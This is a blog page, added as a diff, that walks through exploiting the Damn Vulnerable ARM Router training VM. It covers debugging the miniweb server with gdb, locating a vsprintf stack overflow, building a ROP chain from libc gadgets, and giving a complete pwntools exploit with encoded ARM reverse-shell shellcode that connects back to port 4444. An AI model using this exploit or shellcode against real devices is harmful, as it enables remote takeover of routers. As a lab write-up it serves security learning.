@@ -1,0 +1,441 @@
+<!DOCTYPE html>
+<html lang="en"><head>
+  <meta charset="utf-8">
+  <meta http-equiv="X-UA-Compatible" content="IE=edge">
+  <meta name="viewport" content="width=device-width, initial-scale=1"><!-- Begin Jekyll SEO tag v2.7.1 -->
+<title>[write-up] Damn Vulnerable Arm Router | Sungur Labs</title>
+<meta name="generator" content="Jekyll v3.9.0" />
+<meta property="og:title" content="[write-up] Damn Vulnerable Arm Router" />
+<meta name="author" content="GitHub User" />
+<meta property="og:locale" content="en_US" />
+<meta name="description" content="Solution of Damn Vulnerable Arm Router machine." />
+<meta property="og:description" content="Solution of Damn Vulnerable Arm Router machine." />
+<link rel="canonical" href="http://localhost:4000/2021/09/30/write-up-damn-vulnerable-arm-router.html" />
+<meta property="og:url" content="http://localhost:4000/2021/09/30/write-up-damn-vulnerable-arm-router.html" />
+<meta property="og:site_name" content="Sungur Labs" />
+<meta property="og:type" content="article" />
+<meta property="article:published_time" content="2021-09-30T00:00:00-07:00" />
+<meta name="twitter:card" content="summary" />
+<meta property="twitter:title" content="[write-up] Damn Vulnerable Arm Router" />
+<script type="application/ld+json">
+{"@type":"BlogPosting","mainEntityOfPage":{"@type":"WebPage","@id":"http://localhost:4000/2021/09/30/write-up-damn-vulnerable-arm-router.html"},"url":"http://localhost:4000/2021/09/30/write-up-damn-vulnerable-arm-router.html","dateModified":"2021-09-30T00:00:00-07:00","author":{"@type":"Person","name":"GitHub User"},"headline":"[write-up] Damn Vulnerable Arm Router","description":"Solution of Damn Vulnerable Arm Router machine.","datePublished":"2021-09-30T00:00:00-07:00","@context":"https://schema.org"}</script>
+<!-- End Jekyll SEO tag -->
+<link rel="stylesheet" href="/assets/css/style.css">
+  <link rel="icon" type="image/png" href="/assets/favicon.png" />
+  <link rel="stylesheet" href="/assets/css/magnific-popup.css"><link type="application/atom+xml" rel="alternate" href="http://localhost:4000/feed.xml" title="Sungur Labs" /><script src="https://code.jquery.com/jquery-3.2.0.min.js"></script> 
+  <script src="/assets/js/jquery.magnific-popup.js"></script>
+</head>
+<body><div class="site-header">
+  <div class="wrapper">
+    <a class="site-title" rel="author" href="/">Sungur Labs<b class="command_prompt"></b><b class="blinking_cursor">_</b></a>
+    <span class="social_links">
+        
+        
+        <a class="color-cyan-hover" href="https://twitter.com/sungurlabs"><i class="fab fa-twitter-square"></i></a>
+        
+        
+        
+        <a class="color-purple-hover" href="https://github.com/sungurlabs"><i class="fab fa-github-square"></i></a>
+        
+        
+    </span>
+  </div>
+</div>
+<main class="page-content" aria-label="Content">
+      <div class="wrapper">
+        
+  <div class="author-box">
+    
+    
+        <img src="
+            /assets/avatar.png
+        " class="author-avatar" alt="Avatar" />
+    
+This is a project that aims to do security research around low-level area.
+
+</div>
+
+
+<div class="post">
+  <h1 class="post-title">[write-up] Damn Vulnerable Arm Router</h1>
+  
+  <div class="post-tags">
+      
+      <a class="tag" href="/tag/iot/">iot</a>
+      
+      <a class="tag" href="/tag/hardware/">hardware</a>
+      
+      <a class="tag" href="/tag/router/">router</a>
+      
+      <a class="tag" href="/tag/exploitation/">exploitation</a>
+      
+      <a class="tag" href="/tag/vulnerability/">vulnerability</a>
+      
+  </div>
+  
+  <div class="post-date">Published on 30 Sep 2021</div>
+  
+  <noscript>
+    <div class="post-description">Solution of Damn Vulnerable Arm Router machine.</div>
+  </noscript>
+  <div id="animated-post-description" class="post-description" style="display: none;"></div>
+  
+  <p>(This article was previously written in Turkish by one of our teammates. Oct 24, 2020)</p>
+
+<p>Hello, in this article, we will solve the DVAR machine, which you can reach from <a href="https://blog.exploitlab.net/2018/01/dvar-damn-vulnerable-arm-router.html">this</a> address. DVAR is an ARM Linux based router virtual machine. It runs a web server that acts as an admin panel. Using the vulnerability found in this web server, we will prepare an exploit code that can remotely control the router. When we run the virtual machine, it gives us an IP address and we can access the router management panel with this address. As seen in the picture below, some services are running on 3 different ports on the router. With port 22, we can make ssh connection to the device and control the device. In the debugging phase, ssh will help us. Two different web servers are running on ports 80 and 8080. There is a router interface on port 80. On the 8080 port, there is a traffic light application. In this article, we will examine the service on port 80. Traffic light application is the subject of another article.</p>
+
+<p><img src="/images/dvar_1.png" alt="dvar_1.png" /></p>
+
+<p><img src="/images/dvar_2.png" alt="dvar_2.png" /></p>
+
+<p>When we reach the address 192.168.227.128:80 on our host machine, the router admin panel welcomes us. There are some settings that we are used to seeing in a classic router management panel. With the “HELPFUL HINTS” button at the bottom, we can view the page where we can get some tips about the challenge.</p>
+
+<p><img src="/images/dvar_3.png" alt="dvar_3.png" /></p>
+
+<p>As we can see from the steps, we will cause a stack-based buffer overflow with an HTTP request, and then we will redirect the program to our own shellcode by controlling the PC register. To find out which process is running on port 80, we can use the “netstat -apeen” command after connecting to the machine via ssh. As seen in the picture, the process named “miniweb” runs the administration panel application we are interested in.</p>
+
+<p><img src="/images/dvar_4.png" alt="dvar_4.png" /></p>
+
+<p>Let’s examine the admin panel to identify the relevant HTTP request that caused the vulnerability.</p>
+
+<p><img src="/images/dvar_5.png" alt="dvar_5.png" /></p>
+
+<p>The HTTP request that occurs when we enter the “TEST” value in the Host name field and click the “Save Settings” button is as follows.</p>
+
+<p><img src="/images/dvar_6.png" alt="dvar_6.png" /></p>
+
+<p>At first we can use gdb to monitor the behavior of the program and see possible crashes. For this, we will use the gdbserver already installed on the virtual machine. “gdbserver :1234 –attach $(pidof miniweb)” with this command, we will be able to debug the miniweb process in the virtual machine through our host machine. We can use gdb-multiarch because our host machine is intel architecture and the program we will debug has ARM architecture. After starting gdb-multiarch without parameters, we can now debug the mini web process running in the virtual machine with the command “target remote 192.168.227.128:1234”. Since the miniweb server creates a new child process with each request we send, we will be able to capture the child processes related to this command “set follow-fork-mode child”.</p>
+
+<p><img src="/images/dvar_7.png" alt="dvar_7.png" /></p>
+
+<p>Now we have prepared the debug environment that can investigate the crash.</p>
+
+<p><img src="/images/dvar_8.png" alt="dvar_8.png" /></p>
+
+<p>After running the Continue (c) command, the program starts to wait for requests from the user. At this point we can examine the behavior of the program by sending different types of requests. As a result of my experiments, I noticed that there was a crash when too many values were entered in the request query.</p>
+
+<p><img src="/images/dvar_9.png" alt="dvar_9.png" /></p>
+
+<p>The vulnerability is in the Log() function in the miniweb binary. The log() function writes the user’s request URL and IP address to a specific log file. The vsprintf() function in the standard C library is used for this writing. The vsprintf() function allows to write the arguments in the va_list formatted to a specified stream. When using vsprintf(), since the IP and URL arguments are processed without checking their sizes, the allocated buffer area overflow and vulnerability occurs. The assembly commands of the part that causes the security vulnerability in the Log() function are shown in the picture below.</p>
+
+<p><img src="/images/dvar_10.png" alt="dvar_10.png" /></p>
+
+<pre><code class="language-C">vsprintf@plt (
+       $r0 = buffer,
+       $r1 = Format string → "Connection from %s, request = "GET %s"",
+       $r2 = IP,
+       $r3 = URL
+    )
+</code></pre>
+
+<p>Normally, the data in the log file is as follows.</p>
+
+<p><img src="/images/dvar_11.png" alt="dvar_11.png" /></p>
+
+<p><img src="/images/dvar_12.png" alt="dvar_12.png" /></p>
+
+<p>As seen in the picture, we were able to overwrite the PC and LR registers. At this point, we should pay attention to one detail. Although we only sent the ‘A’ character, the last value in the PC register was set to 0 when expected to be 1. This is an issue related to the use of registers during mode switching on ARM processors. This behavior occurs because the least significant bit (lsb) of the PC register is automatically set to 0 by the processor. We should pay attention to this detail while preparing the exploit code.</p>
+
+<p><img src="/images/dvar_13.png" alt="dvar_13.png" /></p>
+
+<p>In the next step, we need to find the offset value. In this way, we can learn after how many characters we can write on the PC. We can use the “pattern create” feature in gef for this.</p>
+
+<p><img src="/images/dvar_14.png" alt="dvar_14.png" /></p>
+
+<p><img src="/images/dvar_15.png" alt="dvar_15.png" /></p>
+
+<p><img src="/images/dvar_16.png" alt="dvar_16.png" /></p>
+
+<p>As can be seen from the last picture, we learned that the offset value is 341. At this point, we can change the flow of the program as we want. As you can see from the picture below, there are no security protections in the program. This means that we can easily run the shellcode that we will place in the stack area.</p>
+
+<p><img src="/images/dvar_17.png" alt="dvar_17.png" /></p>
+
+<p>As can be seen in the picture below, the program returns operation with the “pop {r11,lr}” and “bx lr” instruction at address 0x0001353c. The value of the LR register is taken from the stack and the program branches to that address. Since we can already write on LR, we can redirect the program wherever we want. At this point, we will try to run our shellcode by redirecting the program flow to the stack area using the ROP technique. In order for the program to run the shellcode on the stack, we will need an instruction such as “mov pc，sp”.</p>
+
+<p><img src="/images/dvar_18.png" alt="dvar_18.png" /></p>
+
+<p>We can search for the instructions we need within the program, as well as in shared libraries. Our task will be easier as there is no ASLR protection. We will use the tool called ropper for this. We can use vmmap command on gef to see the libraries imported by the program and their paths.</p>
+
+<p><img src="/images/dvar_19.png" alt="dvar_19.png" /></p>
+
+<p>We will need to import the library file to our host machine so that we can search for the instructions we need in the libc.so library with the Ropper tool. For this, we can copy the library file to the server root directory and bring it to our host machine with the help of wget.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">cp</span> /lib/libc.so /www/htdocs/ 
+wget http://192.168.227.128/libc.so
+</code></pre></div></div>
+
+<p>When we searched for the mov command to place the sp address in the pc register with the command “ropper -file libc.so -search “mov pc, sp”” we could not get any results.</p>
+
+<p><img src="/images/dvar_20.png" alt="dvar_20.png" /></p>
+
+<p>If this instruction we are looking for existed, we could easily redirect the program flow to the stack area. We will now look for ways to do this indirectly. For this, we can look for instructions to move the SP address to a specific register and move this register to the PC register. First, let’s see the instructions that move to the PC register.</p>
+
+<p><img src="/images/dvar_21.png" alt="dvar_21.png" /></p>
+
+<p>Two different instructions were found. The “mov pc, r5” instruction is good enough for us. In the next step, let’s check if there is an instruction where the SP register is assigned to the r5 register.</p>
+
+<p><img src="/images/dvar_22.png" alt="dvar_22.png" /></p>
+
+<p>Unfortunately, it did not turn out as we intended. At this point, it seems that the number of gadgets we will use will increase. We should be able to somehow assign the SP address to the r5 register. We can use one more register to do this. Let’s determine the other registers that assign the r5 register.</p>
+
+<p><img src="/images/dvar_23.png" alt="dvar_23.png" /></p>
+
+<p>As can be understood from the output, we see that there are r0,r1,r3 registers assigned to the r5 register. If we assume that SP address is assigned to one of these three registers, we will reach our goal. Let’s test this scenario for register r0.</p>
+
+<p><img src="/images/dvar_24.png" alt="dvar_24.png" /></p>
+
+<p>Yes we are on our lucky day, the instruction at 0x00024100 is fine for us. Finally, we have identified gadgets that will indirectly perform the “mov pc, sp” function.</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>1 - 0x00024100: mov r0, sp; blx r6; 
+2 - 0x00052454: mov r5, r0; cmp r3, #0; mov r4, r1; beq #0x52478; blx r3; 
+3 - 0x0004d8d4: mov pc, r5; mov r7, #1; svc #0; mov lr, pc; bx r5;
+</code></pre></div></div>
+
+<p>At the last stage, we must associate the addresses they return with each other so that the gadgets we have determined can work in order. We currently have 3 gadgets and two of them have return addresses in registers r3 and r6. We must assign the address 0x00024100 to the PC register, the address 0x00052454 to the r6 register, and the 0x0004d8d4 to the r3 register. We can make these assignments with an suitable pop instruction.</p>
+
+<p><img src="/images/dvar_25.png" alt="dvar_25.png" /></p>
+
+<p>So far, we have determined the ROP steps that will make our shellcode work.</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>1 - 0x0003c8f0: pop {r3, r4, r5, r6, r7, r8, sb, sl, fp, pc}; 
+2 - 0x00024100: mov r0, sp; blx r6; 
+3 - 0x00052454: mov r5, r0; cmp r3, #0; mov r4, r1; beq #0x52478; blx r3; 
+4 - 0x0004d8d4: mov pc, r5; mov r7, #1; svc #0; mov lr, pc; bx r5; 
+5 - Shellcode
+</code></pre></div></div>
+
+<p>As we remember, the stack overflow vulnerability was in the Log() function in the program and it crashed when trying to branch into the overwritten LR register. At this point, we will give the address of the first gadget to the LR register and the program will not crash and will continue to run in the flow we set.</p>
+
+<p>log() function:</p>
+
+<pre><code class="language-assembly">.
+.
+.
+pop {r11,lr};
+add sp,sp,#16;
+bl lr;"
+</code></pre>
+
+<p>It’s time to prepare the exploit code. There are some details we should pay attention to. Since the stack area is reduced to 16 bytes at the output of the log function, we must enter an extra 16 characters in our payload. In addition, since the addresses of our gadgets are referenced from the zero address, those addresses we have determined are not correct. The gadgets are in the “libc.so” library and this library is located in the program memory area from 0x40000000. Therefore, when adding the gadget addresses to the exploit code, we should add this offset value.</p>
+
+<p>The final exploit code is as follows:</p>
+
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
+<span class="kn">import</span> <span class="nn">struct</span>
+
+<span class="n">buff</span> <span class="o">=</span> <span class="s">"A"</span><span class="o">*</span><span class="mi">337</span>
+<span class="n">r11</span> <span class="o">=</span> <span class="s">"AAAA"</span>
+<span class="n">lr</span> <span class="o">=</span> <span class="mh">0x4003c8f0</span> <span class="c1">#0x40000000 + 0x0003c8f0
+</span><span class="n">stuff</span> <span class="o">=</span> <span class="s">"A"</span><span class="o">*</span><span class="mi">16</span>
+<span class="n">r3</span> <span class="o">=</span> <span class="mh">0x4004d8d4</span> <span class="c1">#0x40000000 + 0x0004d8d4
+</span><span class="n">r4</span> <span class="o">=</span> <span class="s">"BBBB"</span>
+<span class="n">r5</span> <span class="o">=</span> <span class="s">"CCCC"</span>
+<span class="n">r6</span> <span class="o">=</span> <span class="mh">0x40052454</span> <span class="c1">#0x40000000 + 0x00052454
+</span><span class="n">r7</span> <span class="o">=</span> <span class="s">"DDDD"</span>
+<span class="n">r8</span> <span class="o">=</span> <span class="s">"EEEE"</span>
+<span class="n">sb</span> <span class="o">=</span> <span class="s">"FFFF"</span>
+<span class="n">sl</span> <span class="o">=</span> <span class="s">"GGGG"</span>
+<span class="n">fp</span> <span class="o">=</span> <span class="s">"HHHH"</span>
+<span class="n">pc</span> <span class="o">=</span> <span class="mh">0x400240fc</span> <span class="c1">#0x40000000 + 0x400240fc 
+</span><span class="n">reverse_shell</span> <span class="o">=</span> <span class="s">"</span><span class="se">\x01\x30\x8f\xe2\x13\xff\x2f\xe1\x40\x40\x02\x30\x01\x21\x52\x40\x64\x27\xb5\x37\x01\xdf\x06\x1c\x0b\xa1\x4a\x70\x10\x22\x02\x37\x01\xdf\x30\x1c\x49\x40\x3f\x27\x01\xdf\x30\x1c\x01\x31\x01\xdf\x30\x1c\x01\x31\x01\xdf\x06\xa0\x52\x40\x05\xb4\x69\x46\xc2\x71\x0b\x27\x01\xdf\xff\xff\xff\xff\x02\xaa\x11\x5c\xc0\xa8\xe3\x82\x2f\x62\x69\x6e\x2f\x73\x68\x58</span><span class="s">"</span>
+
+<span class="n">payload</span> <span class="o">=</span> <span class="n">buff</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="n">r11</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="n">struct</span><span class="p">.</span><span class="n">pack</span><span class="p">(</span><span class="s">"I"</span><span class="p">,</span> <span class="n">lr</span><span class="p">)</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="n">stuff</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="n">struct</span><span class="p">.</span><span class="n">pack</span><span class="p">(</span><span class="s">"I"</span><span class="p">,</span> <span class="n">r3</span><span class="p">)</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="n">r4</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="n">r5</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="n">struct</span><span class="p">.</span><span class="n">pack</span><span class="p">(</span><span class="s">"I"</span><span class="p">,</span> <span class="n">r6</span><span class="p">)</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="n">r7</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="n">r8</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="n">sb</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="n">sl</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="n">fp</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="n">struct</span><span class="p">.</span><span class="n">pack</span><span class="p">(</span><span class="s">"I"</span><span class="p">,</span> <span class="n">pc</span><span class="p">)</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="n">reverse_shell</span>
+
+<span class="n">conn</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="s">'192.168.227.128'</span><span class="p">,</span> <span class="mi">80</span><span class="p">)</span>
+<span class="n">conn</span><span class="p">.</span><span class="n">send</span><span class="p">(</span><span class="sa">b</span><span class="s">'GET /'</span> <span class="o">+</span> <span class="n">payload</span> <span class="o">+</span><span class="s">"</span><span class="se">\r\n\r\n</span><span class="s">"</span><span class="p">)</span>
+
+</code></pre></div></div>
+
+<p><img src="/images/dvar_26.png" alt="dvar_26.png" /></p>
+
+<p><img src="/images/dvar_27.png" alt="dvar_27.png" /></p>
+
+<p>The exploit code ran successfully and made a reverse shell connection to port 4444, which we had listening on our host machine. Thank you to those who have read this far. See you in future posts :)</p>
+
+</div>
+
+
+<div class="comments">
+<div id="disqus_thread"></div>
+<script>
+ var disqus_config = function () {
+     this.page.url = 'http://localhost:4000/2021/09/30/write-up-damn-vulnerable-arm-router.html';
+     this.page.identifier = '/2021/09/30/write-up-damn-vulnerable-arm-router';
+     this.page.title = '[write-up] Damn Vulnerable Arm Router';
+ };
+
+ (function() {  // REQUIRED CONFIGURATION VARIABLE: EDIT THE SHORTNAME BELOW
+     var d = document, s = d.createElement('script');
+
+     s.src = '//sungurlabs-github-io.disqus.com/embed.js';
+
+     s.setAttribute('data-timestamp', +new Date());
+     (d.head || d.body).appendChild(s);
+ })();
+</script>
+<noscript>Please enable JavaScript to view the <a href="https://disqus.com/?ref_noscript" rel="nofollow">comments powered by Disqus.</a></noscript>
+
+</div>
+
+
+
+
+<div class="related">
+  <h2>related posts</h2>
+  <ul class="related-posts">
+    
+      <li>
+        <h3>
+          <a href="/2021/07/14/Xiaomi-Smart-Camera-Recovering-Firmware-and-Backdooring.html">
+            Xiaomi Smart Camera - Recovering Firmware and Backdooring
+          </a>
+        </h3>
+      </li>
+    
+  </ul>
+</div>
+
+
+
+
+  
+  <h2>all tags</h2>
+  <div class="tag-cloud"><a href="/tag/camera/" class="set-1">camera</a> <a href="/tag/exploitation/" class="set-1">exploitation</a> <a href="/tag/hardware/" class="set-5">hardware</a> <a href="/tag/iot/" class="set-5">iot</a> <a href="/tag/router/" class="set-1">router</a> <a href="/tag/vulnerability/" class="set-1">vulnerability</a></div>
+  
+
+
+
+
+<script>
+  let i = 0;
+  const text = 'Solution of Damn Vulnerable Arm Router machine.';
+  const speed = parseInt('50');
+  
+  function typeWriter() {
+    if (i < text.length) {
+      document.getElementById('animated-post-description').innerHTML += text.charAt(i);
+      i++;
+      setTimeout(typeWriter, speed);
+    }
+  }
+
+  document.getElementById('animated-post-description').style.display = 'initial';
+  typeWriter();
+
+  // Image modal
+  var $imgs = [];
+  $('img').each(function(idx) {
+    var obj = {
+      src: $(this).attr('src')
+    }
+    $imgs.push(obj);
+    var elem = $(this);
+    $(this).click(function() {
+      $('.modal').magnificPopup('open', idx);
+    });
+  });
+
+  $('.modal').magnificPopup({
+    items: $imgs,
+    type: 'image',
+    closeOnContentClick: true,
+    mainClass: 'mfp-img-mobile',
+    image: {
+      verticalFit: true
+    }
+    
+  });
+</script>
+
+      </div>
+    </main><footer class="site-footer">
+  <div class="wrapper">
+    <div class="credits"><a href="https://github.com/bitbrain/jekyll-dash">dash</a> theme for Jekyll by <a href="https://github.com/bitbrain">bitbrain</a> made with <i class="fas fa-heart"></i><div class="toggleWrapper">
+    <input type="checkbox" class="dn" id="theme-toggle" onclick="modeSwitcher()" checked />
+    <label for="theme-toggle" class="toggle">
+    <span class="toggle__handler">
+      <span class="crater crater--1"></span>
+      <span class="crater crater--2"></span>
+      <span class="crater crater--3"></span>
+    </span>
+        <span class="star star--1"></span>
+        <span class="star star--2"></span>
+        <span class="star star--3"></span>
+        <span class="star star--4"></span>
+        <span class="star star--5"></span>
+        <span class="star star--6"></span>
+    </label>
+</div>
+<script type="text/javascript">
+const theme = localStorage.getItem('theme');
+
+if (theme === "light") {
+    document.documentElement.setAttribute('data-theme', 'light');
+} else {
+    document.documentElement.setAttribute('data-theme', 'dark');
+}
+const userPrefers = getComputedStyle(document.documentElement).getPropertyValue('content');
+
+function activateDarkTheme() {
+    document.getElementById('theme-toggle').checked = true;
+    document.documentElement.setAttribute('data-theme', 'dark');
+    document.documentElement.classList.add('theme--dark');
+    document.documentElement.classList.remove('theme--light');
+	document.getElementById("theme-toggle").className = 'light';
+	window.localStorage.setItem('theme', 'dark');
+}
+
+function activateLightTheme() {
+    document.getElementById('theme-toggle').checked = false;
+    document.documentElement.setAttribute('data-theme', 'light');
+    document.documentElement.classList.add('theme--light');
+    document.documentElement.classList.remove('theme--dark');
+	document.getElementById("theme-toggle").className = 'dark';
+	window.localStorage.setItem('theme', 'light');
+}
+
+if (theme === "dark") {
+    activateDarkTheme();
+} else if (theme === "light") {
+    activateLightTheme();
+} else if  (userPrefers === "light") {
+    activateDarkTheme();
+} else {
+    activateDarkTheme();
+}
+
+function modeSwitcher() {
+	let currentMode = document.documentElement.getAttribute('data-theme');
+	if (currentMode === "dark") {
+	    activateLightTheme();
+	} else {
+	    activateDarkTheme();
+	}
+}
+</script></div>
+  </div>
+</footer>
+
+
+<script>
+      window.FontAwesomeConfig = {
+        searchPseudoElements: true
+      }
+    </script>
+  </body>
+
+</html>
